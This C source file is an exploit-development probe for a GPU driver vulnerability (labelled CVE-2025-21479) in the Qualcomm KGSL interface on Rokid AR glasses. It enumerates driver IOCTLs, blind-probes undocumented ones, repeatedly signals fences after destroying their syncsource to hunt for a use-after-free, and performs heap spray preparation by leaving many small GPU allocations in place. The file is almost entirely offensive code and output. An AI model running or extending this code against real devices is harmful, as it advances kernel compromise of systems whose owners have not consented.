/*
 * CVE-2025-21479 GPU Micronode Probe v3 - Alternative Entry Points
 * =================================================================
 *
 * Since context creation fails on this device, explore other entry points:
 * - Perfcounter IOCTLs (0x38-0x3b) - returned ret=0
 * - Syncsource IOCTLs (0x40-0x43) - known to work
 * - Explore 0x48 (Unknown error 524) and 0x5b (EAGAIN)
 *
 * Strategy: Use syncsource as a proxy for GPU operations,
 * then try to access micronode commands through this path.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

// ═══════════════════════════════════════════════════════════════════════════
// KGSL Definitions
// ═══════════════════════════════════════════════════════════════════════════

#define KGSL_IOC_TYPE 0x09

/* SyncSource structures */
struct kgsl_syncsource_create
{
    unsigned int id;
};

struct kgsl_syncsource_destroy
{
    unsigned int id;
};

struct kgsl_syncsource_create_fence
{
    unsigned int id;
    unsigned int fencefd;
};

struct kgsl_syncsource_signal_fence
{
    unsigned int id;
    unsigned int fencefd;
};

/* Perfcounter structures */
struct kgsl_perfcounter_get
{
    unsigned int groupid;
    unsigned int countable;
    unsigned int offset;
    unsigned int __pad[2];
};

struct kgsl_perfcounter_put
{
    unsigned int groupid;
    unsigned int countable;
    unsigned int __pad[2];
};

struct kgsl_perfcounter_query
{
    unsigned int groupid;
    unsigned int *countables;
    unsigned int count;
    unsigned int max_counters;
    unsigned int __pad[2];
};

struct kgsl_perfcounter_read_group
{
    unsigned int groupid;
    unsigned int countable;
    unsigned long long value;
};

struct kgsl_perfcounter_read
{
    struct kgsl_perfcounter_read_group *reads;
    unsigned int count;
    unsigned int __pad[2];
};

/* GPU memory */
struct kgsl_gpumem_alloc
{
    unsigned long gpuaddr;
    size_t size;
    unsigned int flags;
};

struct kgsl_gpumem_alloc_id
{
    unsigned int id;
    unsigned int flags;
    unsigned int size;
    unsigned int mmapsize;
    unsigned long gpuaddr;
    unsigned int __pad[2];
};

struct kgsl_gpumem_get_info
{
    unsigned long gpuaddr;
    unsigned int id;
    unsigned int flags;
    unsigned int size;
    unsigned int mmapsize;
    unsigned long useraddr;
    unsigned int __pad[4];
};

/* IOCTL definitions */
#define IOCTL_KGSL_SYNCSOURCE_CREATE \
    _IOWR(KGSL_IOC_TYPE, 0x40, struct kgsl_syncsource_create)
#define IOCTL_KGSL_SYNCSOURCE_DESTROY \
    _IOW(KGSL_IOC_TYPE, 0x41, struct kgsl_syncsource_destroy)
#define IOCTL_KGSL_SYNCSOURCE_CREATE_FENCE \
    _IOWR(KGSL_IOC_TYPE, 0x42, struct kgsl_syncsource_create_fence)
#define IOCTL_KGSL_SYNCSOURCE_SIGNAL_FENCE \
    _IOWR(KGSL_IOC_TYPE, 0x43, struct kgsl_syncsource_signal_fence)

#define IOCTL_KGSL_PERFCOUNTER_GET \
    _IOWR(KGSL_IOC_TYPE, 0x38, struct kgsl_perfcounter_get)
#define IOCTL_KGSL_PERFCOUNTER_PUT \
    _IOW(KGSL_IOC_TYPE, 0x39, struct kgsl_perfcounter_put)
#define IOCTL_KGSL_PERFCOUNTER_QUERY \
    _IOWR(KGSL_IOC_TYPE, 0x3a, struct kgsl_perfcounter_query)
#define IOCTL_KGSL_PERFCOUNTER_READ \
    _IOWR(KGSL_IOC_TYPE, 0x3b, struct kgsl_perfcounter_read)

#define IOCTL_KGSL_GPUMEM_ALLOC \
    _IOWR(KGSL_IOC_TYPE, 0x2f, struct kgsl_gpumem_alloc)
#define IOCTL_KGSL_GPUMEM_ALLOC_ID \
    _IOWR(KGSL_IOC_TYPE, 0x34, struct kgsl_gpumem_alloc_id)
#define IOCTL_KGSL_GPUMEM_GET_INFO \
    _IOWR(KGSL_IOC_TYPE, 0x36, struct kgsl_gpumem_get_info)

// Unknown IOCTLs that showed interesting responses
#define IOCTL_KGSL_SPARSE_BIND _IOWR(KGSL_IOC_TYPE, 0x48, char[256])
#define IOCTL_KGSL_GPU_SPARSE_COMMAND _IOWR(KGSL_IOC_TYPE, 0x5b, char[256])

// ═══════════════════════════════════════════════════════════════════════════
// Global State
// ═══════════════════════════════════════════════════════════════════════════

static int kgsl_fd = -1;

// ═══════════════════════════════════════════════════════════════════════════
// Helper Functions
// ═══════════════════════════════════════════════════════════════════════════

void print_banner(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  CVE-2025-21479 GPU Micronode Probe v3 - Alt Entry Points     ║\n");
    printf("║  ───────────────────────────────────────────────────────────  ║\n");
    printf("║  Target: Rokid AR Glasses (Adreno 621, Kernel 5.10.209)       ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");
}

// ═══════════════════════════════════════════════════════════════════════════
// SyncSource Tests - Known Working Entry Point
// ═══════════════════════════════════════════════════════════════════════════

void test_syncsource(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" TEST: SyncSource Operations (Working Entry Point)\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    /* Create syncsource */
    struct kgsl_syncsource_create create = {0};
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_CREATE, &create);

    if (ret == 0)
    {
        printf("[+] SyncSource Created: ID=%u\n", create.id);

        /* Create fence */
        struct kgsl_syncsource_create_fence fence = {
            .id = create.id,
        };
        ret = ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_CREATE_FENCE, &fence);

        if (ret == 0)
        {
            printf("[+] Fence Created: ID=%u, FD=%u\n", fence.id, fence.fencefd);

            /* Try to signal fence */
            struct kgsl_syncsource_signal_fence signal = {
                .id = create.id,
                .fencefd = fence.fencefd,
            };
            ret = ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_SIGNAL_FENCE, &signal);
            printf("    Signal result: %s (ret=%d, errno=%d)\n",
                   ret == 0 ? "SUCCESS" : "FAILED", ret, errno);

            if (fence.fencefd > 0)
            {
                close(fence.fencefd);
            }
        }
        else
        {
            printf("[-] Fence creation failed: %s\n", strerror(errno));
        }

        /* Destroy syncsource */
        struct kgsl_syncsource_destroy destroy = {
            .id = create.id,
        };
        ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_DESTROY, &destroy);
        printf("[*] SyncSource destroyed\n");
    }
    else
    {
        printf("[-] SyncSource creation failed: %s\n", strerror(errno));
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Perfcounter Tests - Returned ret=0 in enumeration
// ═══════════════════════════════════════════════════════════════════════════

/* Perfcounter group IDs */
#define KGSL_PERFCOUNTER_GROUP_CP 0x0
#define KGSL_PERFCOUNTER_GROUP_RBBM 0x1
#define KGSL_PERFCOUNTER_GROUP_PC 0x2
#define KGSL_PERFCOUNTER_GROUP_VFD 0x3
#define KGSL_PERFCOUNTER_GROUP_HLSQ 0x4
#define KGSL_PERFCOUNTER_GROUP_VPC 0x5
#define KGSL_PERFCOUNTER_GROUP_TSE 0x6
#define KGSL_PERFCOUNTER_GROUP_RAS 0x7
#define KGSL_PERFCOUNTER_GROUP_UCHE 0x8
#define KGSL_PERFCOUNTER_GROUP_TP 0x9
#define KGSL_PERFCOUNTER_GROUP_SP 0xA
#define KGSL_PERFCOUNTER_GROUP_RB 0xB
#define KGSL_PERFCOUNTER_GROUP_PWR 0xC
#define KGSL_PERFCOUNTER_GROUP_VBIF 0xD
#define KGSL_PERFCOUNTER_GROUP_VBIF_PWR 0xE

void test_perfcounter(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" TEST: Perfcounter Operations\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    const char *group_names[] = {
        "CP", "RBBM", "PC", "VFD", "HLSQ", "VPC", "TSE", "RAS",
        "UCHE", "TP", "SP", "RB", "PWR", "VBIF", "VBIF_PWR"};

    printf("[*] Querying available perfcounters...\n\n");

    for (int group = 0; group <= 0xE; group++)
    {
        struct kgsl_perfcounter_query query = {
            .groupid = group,
            .countables = NULL,
            .count = 0,
            .max_counters = 0,
        };

        int ret = ioctl(kgsl_fd, IOCTL_KGSL_PERFCOUNTER_QUERY, &query);
        if (ret == 0 && query.max_counters > 0)
        {
            printf("    Group %2d (%s): max_counters=%u\n",
                   group, group_names[group], query.max_counters);
        }
    }

    /* Try to get a perfcounter */
    printf("\n[*] Trying to get CP group counter...\n");
    struct kgsl_perfcounter_get get = {
        .groupid = KGSL_PERFCOUNTER_GROUP_CP,
        .countable = 0,
    };

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_PERFCOUNTER_GET, &get);
    if (ret == 0)
    {
        printf("[+] Got perfcounter: offset=%u\n", get.offset);

        /* Try to read it */
        struct kgsl_perfcounter_read_group read_group = {
            .groupid = KGSL_PERFCOUNTER_GROUP_CP,
            .countable = 0,
        };
        struct kgsl_perfcounter_read read = {
            .reads = &read_group,
            .count = 1,
        };

        ret = ioctl(kgsl_fd, IOCTL_KGSL_PERFCOUNTER_READ, &read);
        if (ret == 0)
        {
            printf("[+] Perfcounter value: %llu\n", read_group.value);
        }
        else
        {
            printf("[-] Perfcounter read failed: %s (errno=%d)\n",
                   strerror(errno), errno);
        }

        /* Put it back */
        struct kgsl_perfcounter_put put = {
            .groupid = KGSL_PERFCOUNTER_GROUP_CP,
            .countable = 0,
        };
        ioctl(kgsl_fd, IOCTL_KGSL_PERFCOUNTER_PUT, &put);
    }
    else
    {
        printf("[-] Perfcounter get failed: %s (errno=%d)\n",
               strerror(errno), errno);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// GPU Memory Tests - Working, needed for command buffers
// ═══════════════════════════════════════════════════════════════════════════

void test_gpumem(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" TEST: GPU Memory Operations\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    /* Allocate GPU memory */
    struct kgsl_gpumem_alloc_id alloc = {
        .flags = 0,
        .size = 4096 * 16, /* 64KB */
    };

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc);
    if (ret == 0)
    {
        printf("[+] GPU Memory Allocated:\n");
        printf("    ID:       %u\n", alloc.id);
        printf("    GPU Addr: 0x%lx\n", alloc.gpuaddr);
        printf("    Size:     %u\n", alloc.size);
        printf("    MmapSize: %u\n", alloc.mmapsize);

        /* Get info */
        struct kgsl_gpumem_get_info info = {
            .id = alloc.id,
        };
        ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_GET_INFO, &info);
        if (ret == 0)
        {
            printf("    Flags:    0x%x\n", info.flags);
            printf("    UserAddr: 0x%lx\n", info.useraddr);
        }

        /* Try to mmap */
        if (alloc.mmapsize > 0)
        {
            void *ptr = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE,
                             MAP_SHARED, kgsl_fd, alloc.id * 4096);
            if (ptr != MAP_FAILED)
            {
                printf("[+] Mapped to userspace: %p\n", ptr);

                /* Write a test pattern */
                memset(ptr, 0x41, 256);
                printf("    Wrote test pattern\n");

                munmap(ptr, alloc.mmapsize);
            }
            else
            {
                printf("[-] mmap failed: %s\n", strerror(errno));
            }
        }
    }
    else
    {
        printf("[-] GPU memory allocation failed: %s\n", strerror(errno));
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Interesting IOCTL Exploration
// ═══════════════════════════════════════════════════════════════════════════

void test_interesting_ioctls(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" TEST: Interesting IOCTLs Exploration\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    /* IOCTL 0x48 returned error 524 (ENOTSUPP) - sparse binding? */
    printf("[*] IOCTL 0x48 (Sparse Bind?)...\n");
    char buf48[256] = {0};
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_SPARSE_BIND, buf48);
    printf("    Result: ret=%d, errno=%d (%s)\n", ret, errno, strerror(errno));

    /* IOCTL 0x5b returned EAGAIN - GPU sparse command? */
    printf("\n[*] IOCTL 0x5b (GPU Sparse Command?)...\n");
    char buf5b[256] = {0};
    ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_SPARSE_COMMAND, buf5b);
    printf("    Result: ret=%d, errno=%d (%s)\n", ret, errno, strerror(errno));

    /* Try with different sized buffers */
    printf("\n[*] Probing IOCTL 0x5b with different buffer sizes...\n");
    for (int size = 8; size <= 256; size += 8)
    {
        unsigned long ioctl_num = _IOWR(KGSL_IOC_TYPE, 0x5b, char[size]);
        char *buf = calloc(1, size);
        if (buf)
        {
            ret = ioctl(kgsl_fd, ioctl_num, buf);
            if (ret != -1 || errno != 11)
            { /* Different from EAGAIN */
                printf("    Size %3d: ret=%d, errno=%d\n", size, ret, errno);
            }
            free(buf);
        }
    }

    /* Explore IOCTL 0x58 which returned ret=0 */
    printf("\n[*] IOCTL 0x58 (returned ret=0)...\n");
    char buf58[256] = {0};
    unsigned long ioctl58 = _IOWR(KGSL_IOC_TYPE, 0x58, char[256]);
    ret = ioctl(kgsl_fd, ioctl58, buf58);
    printf("    Result: ret=%d, errno=%d (%s)\n", ret, errno, strerror(errno));

    /* Print returned data */
    printf("    Returned data (first 64 bytes):\n    ");
    for (int i = 0; i < 64; i++)
    {
        printf("%02x ", (unsigned char)buf58[i]);
        if ((i + 1) % 16 == 0)
            printf("\n    ");
    }
    printf("\n");
}

// ═══════════════════════════════════════════════════════════════════════════
// SyncSource Race Condition Test
// ═══════════════════════════════════════════════════════════════════════════

void test_syncsource_race(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" TEST: SyncSource Race Condition (UAF Pattern)\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    printf("[*] Creating and destroying syncsources rapidly...\n");

    int success = 0, fail = 0;

    for (int i = 0; i < 100; i++)
    {
        /* Create */
        struct kgsl_syncsource_create create = {0};
        if (ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_CREATE, &create) == 0)
        {
            unsigned int id = create.id;

            /* Create fence */
            struct kgsl_syncsource_create_fence fence = {.id = id};
            ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_CREATE_FENCE, &fence);

            /* Destroy syncsource */
            struct kgsl_syncsource_destroy destroy = {.id = id};
            ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_DESTROY, &destroy);

            /* Try to signal fence after destroy */
            struct kgsl_syncsource_signal_fence signal = {
                .id = id,
                .fencefd = fence.fencefd,
            };
            int ret = ioctl(kgsl_fd, IOCTL_KGSL_SYNCSOURCE_SIGNAL_FENCE, &signal);

            if (ret == 0)
            {
                success++;
            }
            else
            {
                fail++;
            }

            if (fence.fencefd > 0)
            {
                close(fence.fencefd);
            }
        }
    }

    printf("[*] Results: %d signal after destroy succeeded, %d failed\n", success, fail);
    if (success > 0)
    {
        printf("[!] INTERESTING: Signal succeeded after destroy - potential UAF!\n");
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Mass Memory Allocation - Heap Spray Preparation
// ═══════════════════════════════════════════════════════════════════════════

void test_heap_spray_prep(void)
{
    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" TEST: Heap Spray Preparation\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    printf("[*] Allocating many GPU memory objects...\n");

    unsigned int ids[256];
    int allocated = 0;

    for (int i = 0; i < 256; i++)
    {
        struct kgsl_gpumem_alloc_id alloc = {
            .flags = 0,
            .size = 128, /* Small allocations - kmalloc-128 slab */
        };

        if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc) == 0)
        {
            ids[allocated++] = alloc.id;
        }
        else
        {
            break;
        }
    }

    printf("[+] Allocated %d GPU memory objects (128 bytes each)\n", allocated);

    /* Get info on distribution */
    if (allocated > 0)
    {
        printf("[*] Sample GPU addresses:\n");
        for (int i = 0; i < 5 && i < allocated; i++)
        {
            struct kgsl_gpumem_get_info info = {.id = ids[i]};
            if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_GET_INFO, &info) == 0)
            {
                printf("    ID %3u: GPU 0x%lx, Flags 0x%x\n",
                       ids[i], info.gpuaddr, info.flags);
            }
        }
    }

    /* Note: Not freeing these - they could be useful for later tests */
    printf("[*] Memory objects left allocated for potential spray use\n");
}

// ═══════════════════════════════════════════════════════════════════════════
// Main
// ═══════════════════════════════════════════════════════════════════════════

int main(int argc, char **argv)
{
    print_banner();

    printf("[*] UID=%d, EUID=%d\n", getuid(), geteuid());

    /* Open KGSL device */
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Failed to open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Opened /dev/kgsl-3d0 (fd=%d)\n", kgsl_fd);

    /* Run tests */
    test_syncsource();
    test_perfcounter();
    test_gpumem();
    test_interesting_ioctls();
    test_syncsource_race();
    test_heap_spray_prep();

    close(kgsl_fd);

    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf(" Probe Complete\n");
    printf("════════════════════════════════════════════════════════════════\n\n");

    return 0;
}
